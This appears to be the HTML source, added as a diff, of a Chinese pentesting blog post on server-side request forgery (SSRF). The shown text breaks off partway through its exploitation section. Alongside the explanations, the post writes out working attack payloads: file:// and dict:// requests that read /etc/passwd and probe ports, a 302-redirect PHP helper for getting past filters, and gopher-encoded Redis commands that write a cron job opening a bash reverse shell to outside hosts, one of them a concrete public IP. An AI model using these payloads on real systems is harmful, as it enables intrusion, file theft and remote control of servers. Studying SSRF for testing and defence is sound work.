@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SSRF漏洞 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="SSRF简介 SSRF(server-site request forge，服务端请求伪造)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网" /><meta name="keywords" content='SSRF, 基础漏洞' /><meta itemprop="name" content="SSRF漏洞">
+<meta itemprop="description" content="SSRF简介 SSRF(server-site request forge，服务端请求伪造)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网"><meta itemprop="datePublished" content="2022-01-17T15:35:54+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="3897"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="SSRF,基础漏洞," /><meta property="og:title" content="SSRF漏洞" />
+<meta property="og:description" content="SSRF简介 SSRF(server-site request forge，服务端请求伪造)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/ssrf%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-17T15:35:54+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="SSRF漏洞"/>
+<meta name="twitter:description" content="SSRF简介 SSRF(server-site request forge，服务端请求伪造)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/ssrf%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://geoer.cn/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/" /><link rel="next" href="https://geoer.cn/xxe%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SSRF漏洞",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/ssrf%E6%BC%8F%E6%B4%9E\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "SSRF, 基础漏洞","wordcount":  3897 ,
+    "url": "https:\/\/geoer.cn\/ssrf%E6%BC%8F%E6%B4%9E\/","datePublished": "2022-01-17T15:35:54+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>SSRF漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2022-01-17&#32;15:35:54><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-17">2022-01-17</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3897 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="SSRF漏洞">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ssrf简介">SSRF简介</a>
+      <ul>
+        <li><a href="#漏洞原理">漏洞原理</a></li>
+        <li><a href="#与csrf区别">与CSRF区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#ssrf危害">SSRF危害</a></li>
+    <li><a href="#ssrf常见位置">SSRF常见位置</a></li>
+    <li><a href="#ssrf漏洞挖掘">SSRF漏洞挖掘</a></li>
+    <li><a href="#ssrf漏洞利用">SSRF漏洞利用</a>
+      <ul>
+        <li><a href="#利用方式">利用方式</a></li>
+        <li><a href="#302-ssrf">302 SSRF</a></li>
+        <li><a href="#ssrf--redis未授权">SSRF + Redis未授权</a>
+          <ul>
+            <li><a href="#gopher协议">gopher协议</a></li>
+            <li><a href="#比如"><strong>比如：</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#ssrf漏洞防御绕过">SSRF漏洞防御绕过</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1利用各种其他协议">1.利用各种其他协议</a></li>
+            <li><a href="#2ip地址进制转换">2.IP地址进制转换</a></li>
+            <li><a href="#3利用">3.利用[::]</a></li>
+            <li><a href="#4利用">4.利用@</a></li>
+            <li><a href="#5短网址">5.短网址</a></li>
+            <li><a href="#6利用特殊域名">6.利用特殊域名</a></li>
+            <li><a href="#7利用dns解析">7.<strong>利用DNS解析</strong></a></li>
+            <li><a href="#8句号">8.<strong>句号</strong></a></li>
+            <li><a href="#9302跳转">9.<strong>302跳转</strong></a></li>
+            <li><a href="#10利用封闭式字符数字">10.利用封闭式字符数字</a></li>
+            <li><a href="#11dnslog无回显注入">11.DNSlog无回显注入</a></li>
+            <li><a href="#12加端口">12.加端口</a></li>
+            <li><a href="#13其他">13.其他</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#ssrf漏洞代码审计">SSRF漏洞代码审计</a>
+      <ul>
+        <li><a href="#php中">PHP中</a></li>
+        <li><a href="#java中">Java中</a>
+          <ul>
+            <li><a href="#敏感函数">敏感函数</a></li>
+            <li><a href="#通常步骤">通常步骤</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#ssrf漏洞防护">SSRF漏洞防护</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="ssrf简介">SSRF简介</h2>
+<p>SSRF(server-site request forge，<strong>服务端请求伪造</strong>)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网的资源，于是就通过服务器去请求内网资源</p>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p>服务器端提供里从其他服务器应用获取数据的功能且没有对目标的地址进行过滤和限制。如常见的从指定URL地址加载图片、文本资源或获取指定页面的网页内容等。</p>
+<p>通常是<strong>由于</strong>攻击者构造的payload传递给服务器，服务端传回的payload未做任何处理直接执行造成的。</p>
+<h3 id="与csrf区别">与CSRF区别</h3>
+<ul>
+<li>CSRF是客户端请求伪造，由客户端发起</li>
+<li>SSRF由服务器发起请求的安全漏洞</li>
+</ul>
+<h2 id="ssrf危害">SSRF危害</h2>
+<ol>
+<li>获取内网主机、端口和banner信息</li>
+<li>对内容的应用程序进行攻击，如Redis，jboss等</li>
+<li>使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
+<ol>
+<li>通过dict协议获取服务器端口运行的服务：dict://127.0.0.1:80</li>
+<li>通过file协议访问计算机中的任意文件：file:///etc/passwd</li>
+<li>sftp代表SSH文件传输协议，tftp即简单文件传输协议，允许客户端从远程主机获取文件</li>
+</ol>
+</li>
+<li>可以攻击内网程序造成溢出</li>
+<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
+</ol>
+<h2 id="ssrf常见位置">SSRF常见位置</h2>
+<ol>
+<li>社交分享功能：获取超链接的标题等内容进行显示</li>
+<li>转码服务：通过URL地址把原网址的网页内容调优使其适合手机屏幕浏览</li>
+<li>在线翻译：给网址翻译对应网页的内容</li>
+<li>图片加载/下载：如富文本框编辑器中的点击下载图片到本地；通过url加载或下载图片</li>
+<li>邮件系统：比如接收邮件服务器地址</li>
+<li>图片、文章收藏功能：网站会获取URL中title及温拌的内尔欧诺个作为以求一个好的用户体验</li>
+<li>未公开的api实现及其他调用url的功能：可以利用google语法加上下文说的关键字来寻找</li>
+<li>云服务厂商：他会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</li>
+<li>网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li>
+<li>数据库内置功能：：是比如mongoDB的copyDatabase函数</li>
+<li>编码处理、属性信息处理、文件处理：比如pdf, word, xml处理器等</li>
+<li>从远程服务器请求资源</li>
+<li>视频解析的网站</li>
+</ol>
+<h2 id="ssrf漏洞挖掘">SSRF漏洞挖掘</h2>
+<ol>
+<li>
+<p>从web功能上寻找：前面常见的位置</p>
+</li>
+<li>
+<p>从url关键字中寻找：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">share
+</span></span><span class="line"><span class="cl">wap
+</span></span><span class="line"><span class="cl">url
+</span></span><span class="line"><span class="cl">link
+</span></span><span class="line"><span class="cl">src
+</span></span><span class="line"><span class="cl"><span class="nb">source</span>
+</span></span><span class="line"><span class="cl">target
+</span></span><span class="line"><span class="cl">u
+</span></span><span class="line"><span class="cl">3g
+</span></span><span class="line"><span class="cl">display
+</span></span><span class="line"><span class="cl">sourceURL
+</span></span><span class="line"><span class="cl">imageURL
+</span></span><span class="line"><span class="cl">domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h2 id="ssrf漏洞利用">SSRF漏洞利用</h2>
+<h3 id="利用方式">利用方式</h3>
+<p>1.让服务端去访问相应的网址，端口扫描：<code> http://www.xxx.com/ssrf.php?u1=http://www.yy.com:3306</code></p>
+<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
+<p>3.可以使用<strong>file、dict、gopher[11]、ftp</strong>协议进行各种漏洞利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 使用file协议读取文件</span>
+</span></span><span class="line"><span class="cl">http://www.xxx.com/ssrf.php?u1<span class="o">=</span>file:///var/www/html/index.php
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#利用dict协议查看端口</span>
+</span></span><span class="line"><span class="cl">curl -v <span class="s1">&#39;http://xxx.com/ssrf.php?url=dict://127.0.0.1:22&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 利用gopher协议攻击redis反弹shell</span>
+</span></span><span class="line"><span class="cl">curl -v
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyourip%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
+<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
+<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
+<p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p>
+<h3 id="302-ssrf">302 SSRF</h3>
+<p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
+<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
+<p>我们继续构造一个302跳转服务，代码如下302.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$schema</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span>     <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;i&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$port</span>   <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$port</span><span class="p">)){</span>  
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: </span><span class="si">$schema</span><span class="s2">://</span><span class="si">$ip</span><span class="s2">/</span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: </span><span class="si">$schema</span><span class="s2">://</span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">/</span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用测试</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dict protocol - 探测Redis</span>
+</span></span><span class="line"><span class="cl">dict://127.0.0.1:6379/info  
+</span></span><span class="line"><span class="cl">curl -vvv <span class="s1">&#39;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># file protocol - 任意文件读取</span>
+</span></span><span class="line"><span class="cl">curl -vvv <span class="s1">&#39;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gopher protocol - 一键反弹Bash</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span>
+</span></span><span class="line"><span class="cl">curl -vvv <span class="s1">&#39;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0 
+</span></span></span><span class="line"><span class="cl"><span class="s1">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  
+</span></span></span><span class="line"><span class="cl"><span class="s1">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3
+</span></span></span><span class="line"><span class="cl"><span class="s1">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ssrf--redis未授权">SSRF + Redis未授权</h3>
+<p>众所周知，redis未授权的三种姿势：</p>
+<p>1.redis写入ssh公钥，获取操作系统权限；</p>
+<p>2.直接向Web目录中写webshell；</p>
+<p>3.linux计划任务执行命令反弹shell。</p>
+<p>使用gopher协议来实现</p>
+<h4 id="gopher协议">gopher协议</h4>
+<ul>
+<li>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议</li>
+<li>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用</li>
+<li>利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求</li>
+<li>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。</li>
+</ul>
+<h4 id="比如"><strong>比如：</strong></h4>
+<p>存在ssrf的漏洞地址为：<code>http://192.168.1.11/ssrf.php?url=</code></p>
+<p>结合gother协议构造符合格式的paylod，从而模拟redis通信</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.1.11/ssrf.php?url<span class="o">=</span>gother://127.0.0.1:6379/_payload
+</span></span><span class="line"><span class="cl"><span class="c1">#转换为：</span>
+</span></span><span class="line"><span class="cl">http://192.168.1.11/ssrf.php?url<span class="o">=</span>gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 这里使用利用redis写计划任务任务来反弹shell的利用方式</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> x <span class="s2">&#34;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.11.12/4444 0&gt;&amp;1\n\n&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/spool/cron/
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename root
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将以上命令构造成符合gopher协议格式，且能够通过URL传输的格式来发送，需要经过如下<strong>步骤</strong>：</p>
+<p>1.将payload进行url编码</p>
+<p>2.替换<code>%0a</code>为<code>%0d%0a</code></p>
+<p>3.然后再重复一次以上的两个步骤</p>
+<blockquote>
